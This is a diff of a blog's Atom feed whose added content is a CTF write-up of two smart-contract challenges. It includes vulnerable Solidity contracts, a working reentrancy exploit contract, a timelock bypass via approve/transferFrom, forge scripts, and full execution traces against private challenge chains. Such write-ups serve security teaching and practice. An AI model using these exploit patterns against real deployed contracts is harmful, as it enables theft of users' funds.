@@ -1,4 +1,748 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://block-programr.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://block-programr.github.io/" rel="alternate" type="text/html" /><updated>2025-08-09T17:37:59+00:00</updated><id>https://block-programr.github.io/feed.xml</id><title type="html">5C4T3R - Smart Contract Security Engineer</title><subtitle>Smart Contract CTF Writeups, Exploits, and Security Research(Blockchain, Solidity, EVM, Ethereum, Audits, Vulnerabilities, and more))</subtitle><entry><title type="html">WWCTF Blockchain Challenges</title><link href="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html" rel="alternate" type="text/html" title="WWCTF Blockchain Challenges" /><published>2025-07-27T00:00:00+00:00</published><updated>2025-07-27T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/07/27/WWCTF</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/07/27/WWCTF.html"><![CDATA[<p>I recently participated in WWCTF with my team, <strong>HackerTroupe</strong>.As usual I solve the smart contract challenges</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://block-programr.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://block-programr.github.io/" rel="alternate" type="text/html" /><updated>2025-10-19T11:22:29+00:00</updated><id>https://block-programr.github.io/feed.xml</id><title type="html">5C4T3R - Smart Contract Security Engineer</title><subtitle>Smart Contract CTF Writeups, Exploits, and Security Research(Blockchain, Solidity, EVM, Ethereum, Audits, Vulnerabilities, and more))</subtitle><entry><title type="html">Qnsec Blockchain Challenges</title><link href="https://block-programr.github.io/writeups/2025/10/19/QnsecCTF.html" rel="alternate" type="text/html" title="Qnsec Blockchain Challenges" /><published>2025-10-19T00:00:00+00:00</published><updated>2025-10-19T00:00:00+00:00</updated><id>https://block-programr.github.io/writeups/2025/10/19/QnsecCTF</id><content type="html" xml:base="https://block-programr.github.io/writeups/2025/10/19/QnsecCTF.html"><![CDATA[<p>I recently participated in QnsecCTF with my team, <strong>HackerTroupe</strong>. As usual, I solved the smart contract challenges.</p>
+
+<h3 id="challenge-1">Challenge 1:</h3>
+
+<p><strong>Description</strong>:
+They provided two contracts:</p>
+
+<p><strong>Challenge.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.6.0;
+
+import "src/CallMeBack.sol";
+
+contract Challenge {
+    address public immutable PLAYER;
+    CallMeBack public immutable CONTRACT;
+
+    bool private solved;
+
+    constructor(address player, address _contract) public {
+        PLAYER = player;
+        
+        CONTRACT = CallMeBack(payable(_contract));
+    }
+
+    function solve() external {
+        require(address(PLAYER).balance &gt; 10 ether, "NOT_ENOUGH_ETHER");
+        solved = true;
+    }
+
+    function isSolved() external view returns (bool) {
+        return solved;
+    }
+}
+
+</code></pre>
+<p><strong>CallmeBack.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.6.0;
+
+contract CallMeBack {
+
+    mapping(address =&gt; uint256) public balances;
+
+    function donate() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function balanceOf(address _who) public view returns (uint256 balance) {
+        return balances[_who];
+    }
+
+    function withdraw(uint256 _amount) public {
+        if (balances[msg.sender] &gt;= _amount) {
+            (bool success,) = msg.sender.call{value: _amount}("");
+            require(success, "ETH transfer failed");
+            balances[msg.sender] -= _amount;
+        }
+    }
+
+    receive() external payable {}
+}
+</code></pre>
+
+<p>Also, they provided nc 161.97.155.116 6969 port which is used to get a private blockchain to solve the challenge.</p>
+
+<p><strong>Analysis</strong>:
+This is a classic reentrancy attack because of checks-effects-interaction violation. If you call outside contracts, first update the value then call the function, otherwise it causes reentrancy!</p>
+
+<p><strong>Steps to solve</strong>:</p>
+
+<ul>
+  <li>Connect to the port and deploy the blockchain:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969
+
+# Press 1
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[callmeback] A random degen has appeared!
+[callmeback] 1 - Launch a new instance
+[callmeback] 2 - Kill your instance
+[callmeback] 3 - Get the flag
+[callmeback] Action? 1
+
+[callmeback] Your ticket: aa40f1a9f367bc64268139a2614ada39
+
+[callmeback] Creating private blockchain...
+[callmeback] Deploying challenge.. (please be patient, this can take a while)
+
+[callmeback] Your private blockchain has been set up,
+[callmeback] it will automatically terminate in 15.0 minutes!
+
+[callmeback] RPC Endpoints:
+[callmeback]     - http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main
+[callmeback]     - ws://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main/ws
+
+[callmeback] The Player private key:         0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0
+[callmeback] The Challenge contract address: 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A
+
+</code></pre>
+
+<ul>
+  <li>Get the CallMeBack contract address. It is stored onchain, you can get it by using foundry commands:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ source .env
+
+# Get CallMeBack address
+CALLMEBACK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
+echo "CallMeBack: $CALLMEBACK"
+
+# Add to .env
+echo "export CALLMEBACK=\"$CALLMEBACK\"" &gt;&gt; .env
+source .env
+</code></pre>
+
+<p>Output:</p>
+<pre><code class="language-Bash">CallMeBack: 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2
+</code></pre>
+
+<p>Then you can see the .env file:</p>
+
+<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/PAmGnlZJFDONDrNiVINEVbpM/main"
+export PRIVATE_KEY="0x665a52bbf260dfab3abdef5d5f4a0892b2d5eddc3d9bd56470b831e25b40d8a0"
+export CHALLENGE="0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A"
+export CALLMEBACK="0xb3CEA24519bcF7da2859A864a624428D1dCF7af2"
+
+</code></pre>
+<p>After that, check the CallMeBack balance, then go for the exploit:</p>
+
+<pre><code class="language-Bash"># Check CallMeBack balance
+cast balance $CALLMEBACK --rpc-url $RPC_URL --ether
+
+# Check Player address
+PLAYER=$(cast wallet address --private-key $PRIVATE_KEY)
+echo "Player: $PLAYER"
+
+# Check Player balance
+cast balance $PLAYER --rpc-url $RPC_URL --ether
+</code></pre>
+
+<p>Output:</p>
+<pre><code class="language-Bash">1.000000000000000000
+Player: 0xd201156e618Bcd1874dCFb01Eebe652b05C87252
+10.000000000000000000
+</code></pre>
+
+<ul>
+  <li>Now write <code class="language-plaintext highlighter-rouge">src/Exploit.sol</code> to exploit the CallMeBack contract:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface ICallMeBack {
+    function donate() external payable;
+    function withdraw(uint256 _amount) external;
+    function balanceOf(address _who) external view returns (uint256);
+}
+
+contract Exploit {
+    ICallMeBack public target;
+    uint256 public amount;
+    
+    constructor(address _target) public {
+        target = ICallMeBack(_target);
+    }
+    
+    function attack() external payable {
+        require(msg.value &gt;= 1 ether, "Need at least 1 ETH");
+        amount = msg.value;
+        
+        target.donate{value: amount}();
+        target.withdraw(amount);
+    }
+    
+    receive() external payable {
+        if (address(target).balance &gt;= amount) {
+            target.withdraw(amount);
+        }
+    }
+    
+    function withdraw() external {
+        msg.sender.transfer(address(this).balance);
+    }
+}
+</code></pre>
+
+<ul>
+  <li>This is the script contract (<code class="language-plaintext highlighter-rouge">script/Solve.s.sol</code>) to attack the CallMeBack.sol:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import "../src/Exploit.sol";
+
+contract SolveScript is Script {
+    function run() external {
+        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
+        address callMeBack = vm.envAddress("CALLMEBACK");
+        address challenge = vm.envAddress("CHALLENGE");
+        
+        vm.startBroadcast(deployerPrivateKey);
+        
+        // Deploy exploit
+        Exploit exploit = new Exploit(callMeBack);
+        console.log("Exploit deployed at:", address(exploit));
+        
+        // Attack with 1 ETH
+        exploit.attack{value: 1 ether}();
+        console.log("Attack executed");
+        
+        // Withdraw stolen funds
+        exploit.withdraw();
+        console.log("Funds withdrawn to player");
+        
+        // Call solve
+        (bool success,) = challenge.call(abi.encodeWithSignature("solve()"));
+        require(success, "Solve failed");
+        console.log("Challenge solved!");
+        
+        vm.stopBroadcast();
+    }
+}
+</code></pre>
+
+<ul>
+  <li>Now run this command to understand how the attack works:
+    <pre><code class="language-Bash">forge script script/Solve.s.sol:SolveScript \
+--rpc-url $RPC_URL \
+--broadcast \
+--legacy \
+-vvvv
+</code></pre>
+  </li>
+  <li>Result:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ forge script script/Solve.s.sol:SolveScript \
+  --rpc-url $RPC_URL \
+  --broadcast \
+  --legacy \
+  -vvvv
+[⠆] Compiling...
+No files changed, compilation skipped
+Traces:
+  [397516] SolveScript::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CALLMEBACK") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
+    │   └─ ← [Return]
+    ├─ [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
+    │   └─ ← [Return] 1002 bytes of code
+    ├─ [0] console::log("Exploit deployed at:", Exploit: [0xD9f928f593C059A6849731E5e86443aEeBaA1375]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [91752] Exploit::attack{value: 1000000000000000000}()
+    │   ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Attack executed") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [7027] Exploit::withdraw()
+    │   ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Funds withdrawn to player") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Challenge solved!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Exploit deployed at: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
+  Attack executed
+  Funds withdrawn to player
+  Challenge solved!
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [222929] → new Exploit@0xD9f928f593C059A6849731E5e86443aEeBaA1375
+    └─ ← [Return] 1002 bytes of code
+
+  [93752] Exploit::attack{value: 1000000000000000000}()
+    ├─ [22385] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::donate{value: 1000000000000000000}()
+    │   └─ ← [Stop]
+    ├─ [36735] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   ├─ [9136] Exploit::receive{value: 1000000000000000000}()
+    │   │   ├─ [8116] 0xb3CEA24519bcF7da2859A864a624428D1dCF7af2::withdraw(1000000000000000000 [1e18])
+    │   │   │   ├─ [417] Exploit::receive{value: 1000000000000000000}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+  [7027] Exploit::withdraw()
+    ├─ [0] 0xd201156e618Bcd1874dCFb01Eebe652b05C87252::fallback{value: 2000000000000000000}()
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+  [22462] 0x74FC4c02856dc6aCB5bAceA849E261de8be1e58A::solve()
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 31337
+
+Estimated gas price: 1.673006184 gwei
+
+Estimated total gas used for script: 614085
+
+Estimated amount required: 0.00102736800250164 ETH
+
+==========================
+
+##### anvil-hardhat
+✅  [Success] Hash: 0xc7198436788802fdc90d36591ff72bb08ce2ae40009a419334dbe6e52646bb61
+Block: 5
+Paid: 0.000046996416714744 ETH (28091 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x887a15a5c7969d0899f1b0b33e78519d3b7f55abd82a179264c64f2031261fa2
+Contract Address: 0xD9f928f593C059A6849731E5e86443aEeBaA1375
+Block: 4
+Paid: 0.000491326783110936 ETH (293679 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x5d0f61180b0d89298b0d070495c32d48ac94b01c1f4f56bcf14307199eb22f18
+Block: 5
+Paid: 0.000158795054960544 ETH (94916 gas * 1.673006184 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0xe0b77ffe40b48c3dd8d5f4cf7c5d604ce09391a34a523e021dc569e01969234b
+Block: 6
+Paid: 0.000072819267164784 ETH (43526 gas * 1.673006184 gwei)
+
+✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000769937521951008 ETH (460212 gas * avg 1.673006184 gwei)
+                                                                                              
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.
+
+Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/broadcast/Solve.s.sol/31337/run-latest.json
+
+Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc/cache/Solve.s.sol/31337/run-latest.json
+</code></pre>
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ # Check if solved
+cast call $CHALLENGE "isSolved()(bool)" --rpc-url $RPC_URL
+
+# Should return: true
+true     
+
+### Challenge successfully completed!
+</code></pre>
+
+<ul>
+  <li>To get Flag:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc$ nc 161.97.155.116 6969
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[callmeback] You dare challenge me?
+[callmeback] 1 - Launch a new instance
+[callmeback] 2 - Kill your instance
+[callmeback] 3 - Get the flag
+[callmeback] Action? 3
+
+[callmeback] What is your ticket? aa40f1a9f367bc64268139a2614ada39
+[callmeback] Congratulations! Here is your flag: QnQSec{r33ntr4nt_c4llb4ck_1s_fun_4nd_3asy_t0_3xpl01t}
+</code></pre>
+
+<h4 id="challenge-2">Challenge 2:</h4>
+
+<p><strong>Description</strong>:
+This is a very simple challenge. It’s a basic ERC20 mechanism to exploit the contract.
+They provided two contracts:
+<strong>Challenge.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "src/Timelock.sol";
+
+contract Challenge {
+    address public immutable PLAYER;
+    Timelock public immutable CONTRACT;
+
+    bool private solved;
+
+    constructor(address player, address _contract) public {
+        PLAYER = player;
+        
+        CONTRACT = Timelock(payable(_contract));
+    }
+
+    function solve() external {
+        require(CONTRACT.balanceOf(PLAYER) == 0, "COINS_NOT_SPENT");
+        solved = true;
+    }
+
+    function isSolved() external view returns (bool) {
+        return solved;
+    }
+}
+
+</code></pre>
+<p><strong>TimeLock.sol</strong>:</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
+contract Timelock is ERC20 {
+    uint256 public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
+        _mint(player, INITIAL_SUPPLY);
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp &gt; timeLock);
+            _;
+        }
+    }
+}
+</code></pre>
+
+<p><strong>Analysis</strong>:
+After understanding these two contracts, this is a very basic challenge to exploit. In ERC20, you can actually transfer tokens using the <code class="language-plaintext highlighter-rouge">transferFrom</code> function. Before this, you just approve tokens. If you approve them, you can get the tokens anytime. But here, you can only get the tokens after a certain time period passes. This is the core fault—you can bypass it using <code class="language-plaintext highlighter-rouge">transferFrom</code> and <code class="language-plaintext highlighter-rouge">approve</code> in ERC20 tokens.</p>
+
+<h4 id="steps-to-solve">Steps to solve:</h4>
+
+<ul>
+  <li>Use nc 161.97.155.116 6970 to get the private blockchain:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ nc 161.97.155.116 6970
+# Press 1
+
+ ██████╗ ███╗   ██╗ ██████╗ ███████╗███████╗ ██████╗     ██████╗████████╗███████╗
+██╔═══██╗████╗  ██║██╔═══██╗██╔════╝██╔════╝██╔════╝    ██╔════╝╚══██╔══╝██╔════╝
+██║   ██║██╔██╗ ██║██║   ██║███████╗█████╗  ██║         ██║        ██║   █████╗  
+██║▄▄ ██║██║╚██╗██║██║▄▄ ██║╚════██║██╔══╝  ██║         ██║        ██║   ██╔══╝  
+╚██████╔╝██║ ╚████║╚██████╔╝███████║███████╗╚██████╗    ╚██████╗   ██║   ██║     
+ ╚══▀▀═╝ ╚═╝  ╚═══╝ ╚══▀▀═╝ ╚══════╝╚══════╝ ╚═════╝     ╚═════╝   ╚═╝   ╚═╝     
+
+[timelock] Welcome anon!
+[timelock] 1 - Launch a new instance
+[timelock] 2 - Kill your instance
+[timelock] 3 - Get the flag
+[timelock] Action? 1
+
+[timelock] Your ticket: 5e1412cd7083b4b49f31098c9b322b16
+
+[timelock] Creating private blockchain...
+[timelock] Deploying challenge.. (please be patient, this can take a while)
+
+[timelock] Your private blockchain has been set up,
+[timelock] it will automatically terminate in 15.0 minutes!
+
+[timelock] RPC Endpoints:
+[timelock]     - http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main
+[timelock]     - ws://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main/ws
+
+[timelock] The Player private key:         0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414
+[timelock] The Challenge contract address: 0xf00F7a89E5da858edB45744e4464E468897c1e1e
+</code></pre>
+
+<ul>
+  <li>After that, find the Timelock contract address which is stored onchain. You can get the address by using foundry cast command:</li>
+</ul>
+
+<pre><code class="language-Bash">nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ cd ~/SCATERLABs/CTFs/Block1/bloc2
+source .env
+
+TIMELOCK=$(cast call $CHALLENGE "CONTRACT()(address)" --rpc-url $RPC_URL)
+echo "export TIMELOCK=\"$TIMELOCK\"" &gt;&gt; .env
+source .env
+</code></pre>
+
+<p>After that, the .env file looks like:</p>
+
+<pre><code class="language-Bash">export RPC_URL="http://161.97.155.116:8545/hMieWJmMSlzbOlCgXEyCBLmw/main"
+export PRIVATE_KEY="0xaabd6bc6c80b62c8e486de2285d9f7a9d59995694a73ed98481e51f0e0016414"
+export CHALLENGE="0xf00F7a89E5da858edB45744e4464E468897c1e1e"
+export TIMELOCK="0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6"
+</code></pre>
+
+<ul>
+  <li>Now write the script file directly to exploit this:</li>
+</ul>
+
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "forge-std/Script.sol";
+import "../src/Timelock.sol";
+import "../src/Challenge.sol";
+
+contract SolveScript is Script {
+    function run() external {
+        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
+        address timelock = vm.envAddress("TIMELOCK");
+        address challenge = vm.envAddress("CHALLENGE");
+        
+        vm.startBroadcast(deployerPrivateKey);
+        
+        Timelock token = Timelock(timelock);
+        address player = vm.addr(deployerPrivateKey);
+        
+        uint256 balance = token.balanceOf(player);
+        console.log("Player balance:", balance);
+        
+        // Step 1: Approve ourselves to spend our own tokens
+        token.approve(player, balance);
+        console.log("Approved:", balance);
+        
+        // Step 2: Use transferFrom to bypass the timelock
+        // Transfer to any address (we'll use address(1) as burn)
+        token.transferFrom(player, address(0x1), balance);
+        console.log("Transferred via transferFrom!");
+        
+        // Step 3: Verify balance is 0
+        uint256 newBalance = token.balanceOf(player);
+        console.log("New balance:", newBalance);
+        
+        // Step 4: Call solve
+        Challenge(challenge).solve();
+        console.log("Challenge solved!");
+        
+        vm.stopBroadcast();
+    }
+}
+</code></pre>
+
+<ul>
+  <li>Run the command:</li>
+</ul>
+
+<pre><code class="language-Bash">   nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+</code></pre>
+
+<ul>
+  <li>Result Logs:</li>
+</ul>
+
+<pre><code class="language-Bash"> nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ source .env
+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+[⠒] Compiling...
+No files changed, compilation skipped
+Traces:
+  [104448] SolveScript::run()
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("TIMELOCK") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::envAddress("CHALLENGE") [staticcall]
+    │   └─ ← [Return] &lt;env var value&gt;
+    ├─ [0] VM::startBroadcast(&lt;pk&gt;)
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(&lt;pk&gt;) [staticcall]
+    │   └─ ← [Return] 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732
+    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 1000000000000000000000000 [1e24]
+    ├─ [0] console::log("Player balance:", 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
+    │   ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Return] true
+    ├─ [0] console::log("Approved:", 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [29614] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
+    │   ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
+    │   └─ ← [Return] true
+    ├─ [0] console::log("Transferred via transferFrom!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("New balance:", 0) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [23895] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
+    │   ├─ [850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   │   └─ ← [Return] 0
+    │   └─ ← [Stop]
+    ├─ [0] console::log("Challenge solved!") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return]
+    └─ ← [Stop]
+
+
+Script ran successfully.
+
+== Logs ==
+  Player balance: 1000000000000000000000000
+  Approved: 1000000000000000000000000
+  Transferred via transferFrom!
+  New balance: 0
+  Challenge solved!
+
+## Setting up 1 EVM.
+==========================
+Simulated On-chain Traces:
+
+  [25296] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::approve(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, 1000000000000000000000000 [1e24])
+    ├─ emit Approval(owner: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, spender: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, value: 1000000000000000000000000 [1e24])
+    └─ ← [Return] true
+
+  [36414] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::transferFrom(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, ECRecover: [0x0000000000000000000000000000000000000001], 1000000000000000000000000 [1e24])
+    ├─ emit Transfer(from: 0xc3c7408C6926E23fB1A46b58AE315eC4710F8732, to: ECRecover: [0x0000000000000000000000000000000000000001], value: 1000000000000000000000000 [1e24])
+    └─ ← [Return] true
+
+  [28395] 0xf00F7a89E5da858edB45744e4464E468897c1e1e::solve()
+    ├─ [2850] 0x7dB30A7050776E09A9a360865Acca1A4Df55b4b6::balanceOf(0xc3c7408C6926E23fB1A46b58AE315eC4710F8732) [staticcall]
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+
+==========================
+
+Chain 31337
+
+Estimated gas price: 1.7756804 gwei
+
+Estimated total gas used for script: 204292
+
+Estimated amount required: 0.0003627573002768 ETH
+
+==========================
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x29230c2b2ecaa6c50f10dd9cf7bf011041a3ef6dd6e07709efecabab33aa96bd
+Block: 3
+Paid: 0.000083350437976 ETH (46940 gas * 1.7756804 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x732a8a01c8f4eeb5ecba94790f10049b4fbc4dacf0e7e4f081281101f35a2697
+Block: 4
+Paid: 0.0000878233769036 ETH (49459 gas * 1.7756804 gwei)
+
+
+##### anvil-hardhat
+✅  [Success] Hash: 0x3a344d2618f955b3c12bb1e4796bb5deaaf42168e119faaeecaacdf59bdc503d
+Block: 4
+Paid: 0.0000862945160792 ETH (48598 gas * 1.7756804 gwei)
+
+✅ Sequence #1 on anvil-hardhat | Total Paid: 0.0002574683309588 ETH (144997 gas * avg 1.7756804 gwei)
+                                                                 
+
+==========================
+
+ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.
+
+Transactions saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/broadcast/Solve.s.sol/31337/run-latest.json
+
+Sensitive values saved to: /home/nithin/SCATERLABs/CTFs/Block1/bloc2/cache/Solve.s.sol/31337/run-latest.json
+
+nithin@ScateR:~/SCATERLABs/CTFs/Block1/bloc2$ forge script script/Solve.s.sol:SolveScript --rpc-url $RPC_URL --broadcast --legacy -vvvv
+[⠊] Compiling...
+No files changed, compilation skipped
+^C
